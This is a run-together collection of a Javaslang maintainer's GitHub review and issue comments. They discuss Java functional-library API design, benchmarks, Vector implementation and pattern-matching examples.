InterruptedException (Scala 2.11.2)\n- Being Aware Scala 2.10.0 Futures Conceal Fatal Exceptions\n. @mvhh Thank you! However, the NonFatalException.of() method isn't part of the public API. The class documentation is right. See\n\nhttp://static.javadoc.io/io.javaslang/javaslang/2.0.5/javaslang/control/Try.NonFatalException.html\nhttp://static.javadoc.io/io.javaslang/javaslang/2.1.0-alpha/javaslang/control/Try.NonFatalException.html\n\nBtw, NonFatalException and FatalException will be deprecated. In 3.0.0 we will use sneaky throw.\n(see also #1722). @hovenko your suggestion sounds good. Also adding isInterrupted() makes sense. The additional method will come (more or less) for free because we do not need to introduce additional state - all information needed will be already present.. See also #1979 . Future was dropped in Vavr 1.0. Very nice, thank you! Please find my comments above.\n. Awesome, thank you!!\n. Yep, can be closed.\n. That was fast! The implementation looks great.\nBut I think we need a second iteration. While looking at our current idea to use Tuples (because of the Function arity bound of 8) I think currying fits better. We can make the following simplifications:\n(of course we go on using type bounds ? super and ? extends, but for the sake of simplicity they are omitted in the following examples)\nSimplify method argument types\n(Function0..2 have super interface in java.util.function)\n- Instead of Function0<R> we write Supplier<R>\n- Instead of Function1<T1, R> we write Function<T1, R>\n- Instead of Function2<T1, T2, R> we write BiFunction<T1, T2, R>\n- For CheckedFunctions we cannot make these 'optimizations'\nCurrying instead of Tuples:\n(Curried type signatures look ugly in Java but the corresponding lambdas are nice to write: x -> (t1, ..., tn) -> r)\n- Instead of CheckedFunction2<Tuple0, Throwable, R> we should use CheckedFunction1<Throwable, CheckedFunction0<R>>\n- Instead of CheckedFunction2<Tuple1<T1>, Throwable, R> we should use CheckedFunction1 <Throwable, CheckedFunction1<T1, R>>\n- Instead of CheckedFunction2<Tuple2<T1, T2>, Throwable, R> we should use CheckedFunction1<Throwable, CheckedFunction2<T1, T2, R>>\n- ...\n- Instead of Function2<Tuple0, Throwable, R> we should use Function<Throwable, Supplier<R>>\n- Instead of Function2<Tuple1<T1>, Throwable, R> we should use Function<Throwable, Function<T1, R>>\n- Instead of Function2<Tuple2<T1, T2>, Throwable, R> we should use Function<Throwable, BiFunction<T1, T2, R>>\n- Instead of Function3<Tuple3<T1, T2, T3>, Throwable, R> we should use Function<Throwable, Function3<T1, T2, T3, R>>\n- ...\nI hope that it is not too much effort for you to apply the changes. The good thing is that we use a generator. There are already examples of switching functions (Supplier, Function, BiFunction).\nUpdate/Note: I'm aware of the fact that parameter types of existing method signatures need also to be changed (see \"Simplify method argument types\"). We will do that in another PR. I created an issue: #1386\nThank you very much!\n. This, Sir, looks awesome! Many thanks.\n. Also some generic types may need to be (co)variant (see also recover() and unchecked()).\n. Fixed with #1395 \n. Great, thank you. I find it also useful. Java has Function.identity(), which can be also written t -> t, so adding a function constant is pretty legitimate.\n. Thank you for the hint. The annotation processor has an Import Manager which generates the import section of generated code. It seems that it does not handle all cases correctly. I will take a look!\n. @Koziolek thanks for reporting!\n. Maybe it is possible in JavaScript to use instanceof (see http://stackoverflow.com/questions/2943805/javascript-instanceof-typeof-in-gwt-jsni). But GWT has to translate the client side Java instanceof to such JavaScript. I don't know if this happens.\n. Mmhh, I don't know if it's worth the effort. Maybe it is better to just not provide the functionality.\n. Issue moved to javaslang/javaslang-gwt#3. Chris Okasaki has the perfect answer, see API Design for Heaps (aka Priority Queues)\n. Nice and clean, thank you!\n. Fixes #1356 \n. Do the sources need to be released in order to slangify GWT?\n. Thx!\n. Can this be closed now after we merged #1547 ? Or is there still work to do?\n(I know that it is an ongoing task removing usages of GWT incompatible classes...)\n. I think GWT support does not need to be deferred to 3.0.0. If we need to wait for the next stable GWT release, we should move GWT support to a post 2.1.0 release. /cc @ruslansennov \n. Thx\n. Thank you for applying my suggestions. Looking at the changes of of, lift and liftTry I'm double-minded if the bounds are really needed. I need to sleep one night about the topic. Maybe widening the bounds does not make sense for one or more of the methods I mentioned above.\nSorry for being undecided here.\n. Okay, we are nearly finished.\nPlease revert the changes for the of Method. The function argument has to be the same type like the result function. The of method does not use generic type bounds.\nExample:\njava\nstatic <T1, T2, R> Function2<T1, T2, R> of(Function2<T1, T2, R> methodReference) {\n    return methodReference;\n}\nExplanation:\nThe purpose of the of method is to turn a lambda expression into a Javaslang function. The arg is returned as-is. It does only work well with lambda expressions. The types of method references cannot be inferred by Java.\nAll other changes are correct. E.g. lift and liftTry look good. We can simplify the lift implementation slightly - I will provide a comment.\n. Great, thank you!\n. Thx!\n. This introduces a new dimension of complexity in the manner that new PRs now have to be checked to be GWT compatible. However, it also adds value.\nThank you!\n. Thx! I need a little time to review the commits.\n. Good point by @eduardmanas about the overhead of require for O(1) operations! Thanks for changing it to assert @paplorinc!\nAlso a valid point about the name convention of static (non-final) fields (-> camel case). Update: just saw that it became obsolete :)\nI will look at the current state of the code tomorrow...\n. > they seem non-final\nalright, I have no strong opinion here - it is ok\n. I will merge it now. The memory usages can be added in another PR.\n. @paplorinc Many thanks!!\n. Thanks!\n. Very nice! The branch has conflict now. Could you please solve them an I will merge. Thanks!\n. Great, thank you!\n. Thank you, this would be a great addition.\n- we take the names removeKeys and removeValues instead of removeAllKeys and removeAllValues\n- all (Bi)Predicate generic args are ? super\n. @valery1707 Multimap has its own interface - it is not a Map. We need to add these methods in a separate PR (in addition to current #1404).\n. Re-openend because of Multimap...\n. Great, thank you! The changes look good to me.\nI think the formatting might change again (whitespace) because we use different formatters. But that is of minor importance.\n. Out of scope for Javaslang. There are projects that do that (see above). Project Valhalla brings value types to Java.\n. Travis-CI build currently breaks with:\nbash\n[ERROR] /home/travis/build/javaslang/javaslang/javaslang/src/main/java/javaslang/collection/TreeMap.java:[27,14]\njavaslang.collection.TreeMap is not abstract and does not override abstract method\nremoveValues(java.util.function.Predicate<? super V>) in javaslang.collection.SortedMap\n. Great, thank you!\n. swap makes sense on Tuple2.\nI currently see no use-case for rotating, so let's leave it away for Tuple3+ for now.\n. Great, thank you!\n. Thank you, I've watched the talk - it is interesting but I currently have no clue how to adapt the ideas and what impact to our library it would have. (Note: simplicity of code also counts for the health of Javaslang)\nMaybe we could experiment with, say Array, on a branch?\n. Ok. What about the bit-mapped vector trie?\n. To me it is not clear what to do. The current idea is 'there is a cool new feature which we do not understand but it might make things (a little/much more?) faster'. In order to decide how to further process we need to sketch a clear picture\n- how the collections should be modified (-> what is the impact to the current code-base?)\n- which collections can be modified (maybe the idea is not applicable to all collections)\nIf the what is clear, we can start doing a spike and measure.\nIf the results are significantly better, then we can decide, if we want to change to code base, depending on the impact to the code.\n. @paplorinc Can we close this for now? If we have suggestion of concrete optimizations we can create additional issues / PRs.\nMy target is to reduce the ever-growing issues towards zero inbox :)\n. Thx!\n. Thank you for the suggestion. I intentionally not added them because of\n- simplicity - it is one of the biggest design-flaws of Java that int, long etc. are not real objects (like in Smalltalk or Scala)\n- the awareness of JEP 218 like Ruslan said\nI will close this issue because specialization for primitive types are out of focus for Javaslang.\n. Note: Lorinc did Vector optimizations that provide more performant primitive support under the hood, i.e. no specialization on the type level was necessary!\n. Cool!\n. Fixes #1290 \n. Great, thank you!\n. Brian Goetz answered to the StackOverflow questions:\nPerson1: \"What's wrong with Runnable?\"\nPerson2: \"I'm sure that the existence of Runnable is why the Java designers felt they didn't need to add another functional interface.\"\nBrian Goetz: \"@Person2: Exactly so.\"\nA Runnable is a functional iterface that does not take parameters and returns nothing. So let's also keep things simple and reuse existing concepts if possible. Bonus points: increased interoperability with existing APIs.\n. > I am not really nazi about this one.\nhaha, phew :sweat_smile:\n. The benchmarks should not run on a regular basis in our CI environments because subsequent benchmarks are not comparable (CI has no fixed hardware).\nWe once decided to run them manually. We need a distinct maven profile!!\n. I see, wasn't aware of the time impact at the time of the review.\nIf we think it is necessary to test the correctness of our benchmarks, maybe we should move the benchmarks into a dedicated repository, having their own CI?\nHowever, to keep them up-to-date it is much easier to have them in the same repo. But in this case I would not run the benchmarks as part of the tests.\n. We will revert nothing! It is just the <module>javaslang-benchmark</module> in the parent pom and the missing benchmark profile we discuss. We need fast builds, let's not execute the benchmark assertions on every CI run.\n. We should separate the concerns. The benchmarks are not part of our production code. They are performance tests but they have no timeline, like code coverage. Benchmarks compare different implementations per run.\nI question if it makes sense to test our performance-tests at all. Writing tests for tests isn't usual. Do we really, I mean really, need the asserts??\n=> keep things as simple as possible\nMy vision is: If it compiles, it works.\n. Yes, I've looked again at the assertions, they make sense.\n90% of the assertions are related to 3rd party libraries (collections are constructed as excpected etc). If we have assertions that check the behavior of Javaslang, e.g. the head is the first element etc., this test should be part of the Javaslang unit tests. There is no reason to run the benchmark assertions on a CI build triggered by a Javaslang source code change.\nI'm still convinced that we should create a separate profile for the benchmarks.\n@paplorinc could you do that please?\n. Yes, I would love to see benchmarks running when running the benchmark maven profile!\n. @paplorinc thank you. I add a new one roughly every year :)\n. To test the assertions during unit-tests, we need only very short-running tests. I think we do not necessarily need memory-usage when unit-testing or do we try to detect memory leaks? I'm not sure if we would find such with the memory usage check.\nAdditionally we need one Maven profile for benchmarks. Those runs include the long-runners and memory usage checks.\n. Parallelizing the javaslang-benchmarks/tests does not work. JMH seems to need exclusive JVM control:\ndiff\n<plugin>\n    <groupId>org.apache.maven.plugins</groupId>\n    <artifactId>maven-surefire-plugin</artifactId>\n    <version>${maven.surefire.version}</version>\n    <configuration>\n+        <parallel>all</parallel>\n+        <useUnlimitedThreads>true</useUnlimitedThreads>\n        <includes>\n            <include>**/*Benchmark.java</include>\n        </includes>\n    </configuration>\n</plugin>\nOutput:\nbash\njava.lang.RuntimeException: org.openjdk.jmh.runner.RunnerException: ERROR: Unable to acquire the JMH lock (/var/folders/7d/_cj3nvt94hj31jzk4hs30zwm0000gp/T//jmh.lock): already taken by another JMH instance, exiting. Use -Djmh.ignoreLock=true to forcefully continue.\n. Yes, I'm working on it.. Does anyone use mvn test -Pbenchmark -pl javaslang to run benchmarks (as described in the parent pom)?\nIt does not work on my machine. I get the following error:\nbash\n[INFO] --- exec-maven-plugin:1.5.0:exec (default) @ javaslang ---\nError: Could not find or load main class javaslang.JmhRunner\n[ERROR] Command execution failed.\nUpdate: It does work as follows:\nmvn test -Pbenchmark -pl javaslang-benchmark. will do. Note: The benchmark assertions currently do not run. We will run them in a separate CI build (see #1710).. Hi Lorinc, thank you for the PR.\nWe still need the benchmarks for Functional Java and PCollections. They are important to Javaslang, maybe more important than the benchmarks for Scala and Clojure. We need all these benchmarks to proof that Javaslang is the best solution available in Java.\nPlease do not add logic to benchmarks like caching. The less code, the better. There should be no additional logic in benchmarking code (or in test code). Simplicity is more important than speed here. One minute more or less does really not matter.\n\nPlease take the following serious - take a walk, breath fresh air and widen your sight again. The benchmarks are already awesome, also the naming is great. These benchmarks are now ready to be taken to the next level... an article!\n. > Not sure how to interpret this exactly\nIt is a Buddhist wisdom. We tend to focus on spots and forget that the world contains infinite(!) much interesting things to explore. I often remind myself to leave a spot, widen my senses and let all the things enter my mind.\nI think the benchmarks are pretty cool now. We have a model for our benchmarks (inner classes), measure mem and cpu, are able to pretty-print it, adjusted the configuration, measure the major libraries, etc.\n\nafter the Vector rewrite is finished :)\n\n\ud83d\udc83 \n. Great, many thanks for all the effort!\n. Hi Oleg, thank you - good point :)\n. Nice one!! \ud83d\udc83 \n. > ps. I can't even create a 1 billion element Vector on my laptop, we should only support it, if we can test it also :/\nYes, you are aright. The trigger was the java.util.stream.Stream. It has long indices, e.g. #skip(long). Because Stream's nature is to be linear-sequential (i.e. linked) and not indexed-sequential, indexing for random-acces makes not so much sense. If e.g. a row number of a 10 TB file is needed, there could be found a workaround by incrementing an variable when processing rows...\nHowever, it is only of interest when processing long-running Streams of data I think. When in doubt, we should do it like Scala's Stream and use int, see #drop(Int).\nLet's use int, if you are ok with that solution.\n. Thank you!\n. Hi @jorander, good to see you again :)\nThanks! @ruslansennov is right, we allow null's in Javaslang. /cc @paplorinc \nI will review it this evening...\n. Thank you J\u00f6rgen, nice finding!! This one is really deep down the rabbit hole of functional laziness :-)\n. Thank you, will check that this evening...\n. Thank you!! Will pull it now.\n. Great, thank you very much!\n. > From that perspective I think the more na\u00efve solution I used is preferable.\n\nOther point-of-views? //cc @danieldietrich\n\nI also prefer the more na\u00efve solution. My intention of having Euler tests is to implement real world examples with the help of the Javaslang API. The more concise the code is, the better. Often optimization means low level, plain Java code. That's not the goal here.\n\nIs there an equivalent for distributing the workload for data in a Javaslang Stream over more cores?\n\nI had it in mind but not further investigated it yet. The work has to be splitted into parts and the result have to be joined again (in the right order, if there is an order). Most of the Javaslang types are Iterable, i.e. they have a method splitterator(). Javaslang's Stream is a linear sequence, i.e. hard/impossible to split. Java's Stream works in a different way. It is not a Stream as we know it from Scala. In Javaslang maybe we could leverage the Future type to move parts of a computation to different threads but I have to think about an API here...\n. Thank you very much!\n. Hi @civitz,\nthank you for using Javaslang and also thank you for your suggestion. I really appreciate it!\nUnfortunately Java's type system is not capable of differentiating the API based on the underlying generic type (the feature is also known as higher order kinds or higher kinded types).\nIf Java could do it, we could implement flatten for example, which flattens a Stream<T> to Stream<U> if it is of type Stream<Stream<U>>.\nProviding specializations for each type argument arity (read: Tuple arity) does not scale very well. Even if it were possible, I don't think that it is practicable from the viewpoint of API design.\nIn an ideal case, Java would have native support for Tuples with a certain degree of syntactic sugar, i.e. given a function someFunction(A, B) and a Stream<(A, B)> these would be equivalent:\njava\nstream.map(t -> someFunction(t));\nstream.map((a, b) -> someFunction((a, b)));\nstream.map((a, b) -> someFunction(a, b));\nThis would scale well from the perspective of API design.\n\nThe only things I can suggest to you are:\n1) Simplify your existing code a bit by writing tuple._1 instead of tuple._1(). The use of the method tuple._1() makes only sense in the case of method references, i.e. tuple::_1.\n2) Consider providing helper methods if the methods are frequently used as shown by you above. Example:\n``` java\n U someFunction(Tuple2 tuple) {\n    return someFunction(tuple._1, tuple._2);\n}\n U someFunction(T1 t1, T2 t2) {\n    ...\n}\n```\nChances are good that the Java compiler is smart enough to substitute the someFunction(Tuple2) calls with someFunction(T1, T2) calls (am I right @paplorinc?).\nAnd then\njava\nstream.map(this::someFunction);\nor\njava\nstream.map(SomeClass::someFunction);\n\nI hope this may help you. I will close this ticket because we can't do anything here.\nThanks again!\nDaniel\n. Thx Lorinc!\n. Updated - Sorry guys, I confused our old lift with the current of. I'm not comfortable with having of1, of2, ... instead of of because of is used as standard name throughout the whole library (and Java itself).\n@nbardiuk, @civitz Yes, great! It is already there:\njava\nstream.map(Function2.of(this::someFunction).tupled())\n~~Your helper is more concise. If we had Function2.of2() instead of Function2.of(), we could write:~~\njava\nstream.map(of2(this::someFunction).tupled())\n~~Maybe we should introduce this syntactic sugar for function type-lifting (and deprecate of?). Is anyone interested in implementing it?~~\n~~But caution: type-lifting is used in different contexts in function programming. E.g. there exist Monad lifting, Functor lifting (also known as fmap), etc. However, the Javaslang core lib only has function type-lifting at the moment.~~\n~~One more word: This special naming would only make sense in the context of lifting for now. We will not rename all other methods (like map -> map2, map3, ...).~~\n. Awesome, thank you! This looks really great :-)\n. Thank you for your suggestion. We align to Scala's Range, which works as follows:\n``` scala\nscala> 0 until 10 // same as Range(0, 10)\nres0: scala.collection.immutable.Range = Range(0, 1, 2, 3, 4, 5, 6, 7, 8, 9)\nscala> 10 until 0 // same as Range(10, 0)\nres1: scala.collection.immutable.Range = Range()\nscala> 10 until 0 by -1 // same as Range(10, 0, -1)\nres2: scala.collection.immutable.Range = Range(10, 9, 8, 7, 6, 5, 4, 3, 2, 1)\n```\nIn Javaslang it looks like this:\n``` java\n// = List(0, 1, 2, 3, 4, 5, 6, 7, 8, 9)\nList.range(0, 10);\n// = List()\nList.range(10, 0);\n// = List(10, 9, 8, 7, 6, 5, 4, 3, 2, 1)\nList.rangeBy(10, 0, -1);\n```\nChanging the current range implementation would break semantics of existing source code. Also it would confuse developers (including me) to have different semantics than in other programming languages. So let's keep the currenty behavior and please use rangeBy. I will close this ticket.\nNote: Throwing exceptions is (in general) no viable solution for Javaslang. Exceptions are concidered evil. Try to work with defined values whenever possible.\n. Great, thank you!\n. Very nice! I will check the changes now...\n. Very nice! I will check the changes now...\n. The PR LGTM. I will pull it now. If I should have forgotten s.th. @paplorinc remarked (other than formatting which we will cover in another PR) please give me a hint.\n. Btw - many thanks, great work!\n. Great, thank you!\n. I would like to see @jorander's Pattern Matching showcase here :`/\nIdea: Could we make an abstract class containing the optimized data structure and provide two implementations, the generalized one and the one with pattern-matching?\n. @paplorinc Let's take the combined solution (A/B) J\u00f6rgen posted. I love it :)\n. I like the first one more because in the second one the nested $() is indirectly determined by the parent match case, which is harder to read.\nWe can simplify the predicate of the first proposal:\njava\nCase(n -> n >= 100 && n % 100 > 0, ...)\n. We can take the second solution. For me this indentation is a bit better readable (but we also can take yours):\njava\nreturn Match(num).of( /*@formatter:off*/\n        Case(n -> n >= 1000,         n -> length(n / 1000) + length(1000) + letterCount(n % 1000)),\n        Case(n -> n >= 100,          n -> Match(n).of(\n            Case(n1 -> n1 % 100 > 0, n1 -> length(n1 / 100) + length(100) + CONJUNCTION.length() + letterCount(n1 % 100)),\n            Case($(),                length(n / 100) + length(100)))),\n        Case(n -> n >= 20,           n -> length(n / 10 * 10) + letterCount(n % 10)),\n        Case(0,                      0),\n        Case($(),                    n -> length(n))\n); /*@formatter:on*/\n. Btw - that would be a cool feature - having nested Cases like this (without typing n -> Match(n).of(:\njava\nCase(n -> n >= 100,\n    Case(n1 -> n1 % 100 > 0, n1 -> length(n1 / 100) + length(100) + CONJUNCTION.length() + letterCount(n1 % 100)),\n    Case($(),                length(n / 100) + length(100))\n),\nCase(n -> n >= 20, n -> length(n / 10 * 10) + letterCount(n % 10)),\n. (Offtopic/new feature):\nLooking at nested Cases, Case(..., Case...) would not make sense because we need at least one case.\nCase(..., Case, Case...) would be ambiguous to Case(..., Function) I think if there is only one nested case.\nSo nested cases will only work with 2+ nested cases: Case(..., Case, Case, Case...) .\n(I think so - have to test it)\n. Great, thank you!\n. Whoopsie - I also didn't see it...\n@ashrko619 What do we do now with solution 24? I pulled @jorander's in a minute ago. (Now there are merge-conflicts)\n. Too much traffic here in Javaslang-land :-)\n. @ronanM yes, great idea! We have to take care to return the general types instead of special types, e.g. Option.none() and Option.some() return Option etc.\nI would place them in javaslang.API (which is generated) instead of Aliases. Maybe we should also provide f1(Function1), ..., f8(Function8) as shortcut for Function1.of(Function1), ... (this would go adhere with this feature request).\n@paplorinc You are right (low cohesion) but on the other hand it would be great to just\nimport static javaslang.API.*\nand have everything at hand :-)\n. Yes, we should cover:\nFunctions\n\nFunction0, ..., Function8 - f0, ..., f8\nCheckedFunction0, ..., CheckedFunction8 - chk_f0, ..., chk_f8 <-- better names? or just cf0, ...cf8?\n\nTuples\n\nTuple0, ..., Tuple8 - tuple(), ..., tuple(T1, ..., T8) (but no aliases like pair etc!)\n\nSingle-Valued Types\n\nEither - left, right\nFuture- future (successful, failed would be too confusing, see Try)\nLazy - lazy\nOption - option, some, none, nothing\nTry - try_ or _try, success, failure\nValidation - valid, invalid\n\nMulti-Valued Types\n\nAnd all collections of the last layer of the following overview (e.g. charSeq, array, vector, (not stack), list, stream, queue, hashMap, ...)\n\n\n. Yes, I will create an issue (or I will forget it...)\nSee javaslang/javaslang-docs#25\n. The scope changed:\n@paploric stated:\n\npublic static <T> $OptionType<T> some(T value) {\ndo we need these?\nWhat's the difference between importing statically Option or API?\nI mean these are already available to us by importing Option statically.\n\nThis is a valid point. Several types already have the static factory methods with similar names:\n- [x] controls (Either, Option, Try, Validation)\n- [x] Future has successful() and failed() (Promise has the same method names...)\n- [ ] Collections\n- [ ] Tuples\n- [ ] Functions\nWe still have additional problems here - some API is ambiguous, e.g.\n``` java\n// returns a success\npublic static  $FutureType future(T result) { ... }\n// returns a failure\npublic static  $FutureType future(Throwable exception) { ... }\n```\nIt was a design decision to use consequently use of throughout our whole codebase, e.g.\n- Tuple.of(1, true, \"nice\")\n- List.of(1, 2, 3)\n- Try.of(() -> computation())\nMain reasons:\n- Java also uses the of API. It looks familiar to the user.\n- Lower case 'constructors' look alien to Java developers.\n- Scala has companion objects which give use upper case constructors without the use of new - that is what we really want. But the upper-case names are already taken by the Pattern Match API in order to deconstruct objects.\n- Minor: Static imports are always a few keystrokes more for the developer, even with an IDE.\nBut: The of notation is not concise enough.\nLike @paplorinc said, we do not need to duplicate the existing API. What we really want are shortcuts for the of factory methods only.\nI would like to have first char upper-case static factory method names within javaslang.API, e.g.\n- Tuple(1, 2), Tuple(1, 2, 3, 4)\n- Function1(obj::methodRef), CheckedFunction1(obj::methodRef)\n- Try(() -> computation()), Option(value), Future(() -> computation())\n- List(1, 2, 3)\n- HashMap(1, \"a\", 2, \"b\", 3, \"c\")\nThis would go adhere with API.Match() and API.Case() etc.\nTo this day static factory methods for (most) collection interfaces were out of scope, e.g.\n- Seq(1, 2, 3)\n- Set(1, 2, 3)\n- Map(1, \"a\", 2, \"b\", 3, \"c\")\nBut maybe it would be nice to have these too.\n\nQ: So, what to do with the names of generated patterns? They will clash with the new API.\nA: We will break backward compatibility and change the annotation processor of javaslang-match. We will generate a preceding $ for patterns. This goes adhere with the use of $ for standard patterns like\n- $() - any\n- $(value) - equality\n- $(predicate) - condition\nExample:\njava\nT result = Match(value).of(\n    Case($Tuple($(1), $(true), $(\"nice\")), (v1, v2, v3) -> ...),\n    Case($List($(1), $()), (head, tail) -> ...)\n);\nWe determine these specialities:\n- $Tuple($(Tuple(1, 2, 3)) will contain a $Tuple pattern and a Tuple constructor. Hard to read?\n- $List($(), $()) deconstructs head element and tail list\n- List(v1, v2) constructs a List containing two values v1, v2\n\nThe bottom line is that this will be a breaking change that will be targeted for 3.0.0\nHowever, the first char upper case constructors can be already introduced but they will raise problems when used in conjunction with the Match API (, e.g. import static javaslang.API.*;).\n. Yes, breaking the lib is a hard decision.\nI think evolution is not possible without changing existing things. Java doesn't do it. Scala did it in the past but got more conservative. Swift 3 will include many breaking changes to make the language better.\nWe use semantic versioning. Major versions break things by definition. But major versions should not appear often.\nOur users need a reliable lib. Having that said, we need to maintain the 2.x streamline. The 3.x streamline will be the next evolution step. I can't foresee all possibilities. Evolution is a feedback-loop considering the outer world.\n. There is one thing that still bothers me - we will have mixed upper case and lower case factory methods, e.g.\n- upper case API.Option() but lower case Option.some(), Option.none()\nThis idea is still unfinished... We need to solve this until 3.0.0\n. @paplorinc asked:\n\n\nThere is one thing that still bothers me - we will have mixed upper case and lower case factory methods, e.g.\n\nCould you please explain the need for upper-camel? If it's simply to model Scala's companion constructor, we could simply translate that to statically-importable lowercase static factories, e.g. option, some, checkedFunction.\nAbout API, well, it could have a prefix of e.g. $ or _, but still lowercase, e.g. $option.\n\nThese are my thoughts:\nFirst view of things: Have consistent/equal naming throughout all Javaslang classes and interfaces\nDeconstructors (read: unapply patterns) and constructors are dual. This should be reflected by the name. I think we have two options: both upper- or both lower case. Distinguishing them is mandatory. A prefix should work fine ('$' would integrate well for the patterns).\nThese are our options:\n- All methods upper or all lower case, e.g. Some()/$Some() vs some()/$some()\n- Define all methods within javaslang.API or all within related types or a hybrid solution\nEach type has several of and ofAll methods in general. When adding new factory methods we concentrate on of(T) and of(T...).\nLooking at Option we will take one of these approaches:\n- API.Option(T), API.Option(T...) and Patterns.$Option()\n- API.option(T), API.option(T...) and Patterns.$option()\n- Option.Option(T), Option.Option(T...) and Patterns.$Option()\n- Option.option(T), Option.option(T...) and Patterns.$option()\nSecond view of things: We could define the following in idiomatic Javaslang\nI like to just import static javaslang.API.* and then start to write Javaslang using Match, For and almost all of the Values, Tuples and (Checked)Functions.\n- Static factory methods related to types are lower case and not intended to be imported statically, e.g. we always use Option.some(...) instead of some(...). This would go adhere with of and ofAll.\n- The javaslang.API is intended to be used as static import only. E.g. we write For and Match instead of API.For and API.Match.\n- API contains the keywords of the Java slang. These keywords are all upper-case in order to circumvent name-clashes with default Java. E.g. we have For and Try(() -> computation) instead of for and try(() -> computation()).\n- We would then add also API.Some() and API.None() in addition to Option.some() and Option.none().\nIn other words Some(...) and Option.some() are different in the way they are used, the former as static import, the latter full qualified. The case indicates the usage.\nPatterns are prefixed upper-case, e.g. $Some(...).\n. Right!\n. Great work!! Now I can sleep better, the version with long was not perfectly integrated. int fits best (and saves memory).\n. Great, thank you! It makes sense to close the gap between other Traversables and our rich string CharSeq.\n. Very nice, please implement it as you suggested.\n. Nice, thank you!\n. The solution looks great. I will pull it in!\n. We reduce the API surface area in favor of adding syntactic sugar.\n\"composition over syntactic sugar\". Thank you! Fixed it.\n. Thank you!\n. Yes, we could also measure classical for-loops vs. Javaslang's For comprehension.\n@mping Are you a volunteer to do such a benchmark? :-)\n. great, thank you\n. Thank you - I'm on it but it will take some time... my vacation is near and I have to do some stuff...\n. We merged the PR. Benchmarks are an ongoing effort, this issue can be closed.\n. @mping Thank you for adding these Benchmarks!\n. Thx!\n. @ashrko619 Thank you!\nIndeed, splitting PRs makes life easier looking at features merged to src/main/java. Otherwise we have a problem when cherry picking features into specific releases. Also code review is simpler when having small PRs.\nCould you please resolve the merge conflicts? I think I've pulled in overlapping code from another PR...\n@ashrko619 @jorander I think we do not need to showcase more features in this special case. The code is already really concise - looks a bit like Haskell :-D\n. @paplorinc do you have an idea how to reduce this PR to the relevant project euler 31 test? At the moment there are 21 files changed. I think something went wrong with the merge!? Could you provide @ashrko619 a magic git command?\n. @ashrko619 many thanks for the PR! When looking at the changed files (21!) I have no good feeling merging it. Please copy/paste the relevant parts (Euler 31 Test) into a new PR. I will close this one.\nI hope you understand.\nGreets\nDaniel\n. Sounds good! Please do it.\n. Many thanks, great work!\n. We once had Consumers but removed it. I need to think about it if we really invest more energy in direction of side-effecting API. Maybe we should 'fall-back' to standard Java API instead of adding additional side-effecting 'functional' API (which is an oxymoron).\n- https://github.com/javaslang/javaslang/issues/139\n- https://github.com/javaslang/javaslang/pull/140/files\n- https://github.com/javaslang/javaslang/issues/756\n. We will not add ConsumerN classes to Javaslang. From the strategic viewpoint it is no good idea. With primitive generics Functions will be automatically Consumers. Adding Consumers now to Javaslang will blow up the types.\nHint: A workaround is to use the API.run method in order to yield Void.\n. Thank you!\n. Hi Lorinc,\nplease let me say that your implementation of Vector is a great piece of work and maybe currently the best immutable Vector implementation available inside and outside of the JVM. I'm deeply impressed!\n\nI've invested thousands of hours within the last three years (beside my daylight job and a family including my wife and 3 (in Nov/Dec 4) kids) to create a community driven platform. I was deeply convinced that I'm able to reify my vision to enhance Java and that the energy will not get lost. I'm proud that so many great people like you bring life to this place.\nPlease don't feel uncomfortable or upset if I steer Javaslang in a direction you don't fully understand (#1480) and keep on the extraordinary work!\nToday I will start to review your Vector impl. Please provide me with all links to resources or papers you've used (if there are some).\nDaniel\n. @paplorinc While starting the review of the implementation I came to the following result:\nI question the approach of leading and trailing objects in Vector. They seem to make sense only the first BRANCHING_FACTOR (= 32) times using drop and tail. Beyond that the code appears to be more clunky and significantly less maintainable.\nI know that you have a different opinion - and that is good! We need diversity, otherwise progress is stopped. I asked Ruslan this morning to implement a more minimal Bit Mapped Trie for comparison. This is the only way I see to make the difference visible.\nMy wish, as always, is not an extremely optimized version of a new feature. In Javaslang we need a working version with main focus on simplicity. Further improvements are discussed by the team/community. Please do not go that deep with your optimizations with your first PR of a new feature!\nIn the past we two often had these discussions. This costs unnecessary energy. My experience is that you follow your own goals but there is a clear Javaslang vision. Simplicity is as important as user experience. If in doubt, simplicity and maintainability win.\nI see that you have the main vision to get the very most out of the performance. Performance is very important. But we follow the rule that there are several collections, each one with its own strengths and drawbacks. The Javaslang way (along with other collections/languages) is to choose the right collection for the right job.\nHowever, this does not mean that we will not get the most out of the Vector operations. Optimization is a difficult task with many facets. The new Vector will come. And your effort will be honored.\n. @paplorinc @zsolt-donca @ruslansennov thank you all for being patient with me. And also thanks for the explanations and all the details.\nRuslan will hold his horses regarding a simpler impl and we will wait for the separate PRs @paplorinc will add.\nI see all the nice things we already have achieved:\n- We now (nearly) have a Bit Mapped Trie (in master branch) - Yay!\n- We have the 'leading and trailing' optimization for linear sequential operations\n- We have an optimization for primitive types behind the scenes - which is really cool\nIn my review I will focus on the following topics:\n- Mandatory: I need to understand the core implementation details\n- Every optimization comes at its cost. CPU is infinite, it is just a matter of time. Mem is finite. So the footprint is important to me.\nHaving a Google Hangout with you guys would be fun :) not only to talk about Vector. My home-base is currently located in a caravan and the wifi on the camping site is terrible (ping is sometimes seconds instead of milliseconds and connection breaks regularly). So we need to wait until start of September when my vacation ended...\n. Thx!\n. That looks very nice, thank you!\n. Tuples are no collections, they intentionally do not have operations such as insert, remove, head, tail, ...\nDo you have a real-world use-case for adding these operations? Instead of building a tuple step-by-step with append and prepend, why not just create a tuple in one step?\nI'm not sure we need these methods. Please convince me :-)\n. I understand, let's pull it in. Please fix the conflicts.\n. Hi @ronanM, thanks for the contribution! I have some comments...\n. Hi @ronanM, many thanks - looks good to me!\nThe build currently breaks because you forgot to check in the generated Tuples of your last Generator.scala change (removed one newline).\nPlease check in the generated Tuples and I will pull it in.\n. Thx!\n. Hi @ronanM, could you please create a new PR. This one broke the build, I had to revert it (see #1505 and https://travis-ci.org/javaslang/javaslang/builds/153129703)\n. Is that Java? ;-) That looks really nice.\n. Thank you!\n. Yes, PR welcome! We also need the corresponding filterTry(CheckedPredicate, Function) as mentioned in #1273 \n. The implementation could look like this (untested):\n```java\n/*\n * \n/\ndefault Try filter(Predicate<? super T> predicate, Function<? super T, ? extends Throwable> errorProvider) {\n    return filterTry(predicate::test, errorProvider::apply);\n}\n/*\n * \n/\ndefault Try filterTry(CheckedPredicate<? super T> predicate, CheckedFunction1<? super T, ? extends Throwable> errorProvider) {\n    return flatMapTry(t -> predicate.test(t) ? this : failure(errorProvider.apply(t)));\n}\n``\n. Thx!\n. Do you know why theForBenchmark is failing`?\nTests run: 1, Failures: 0, 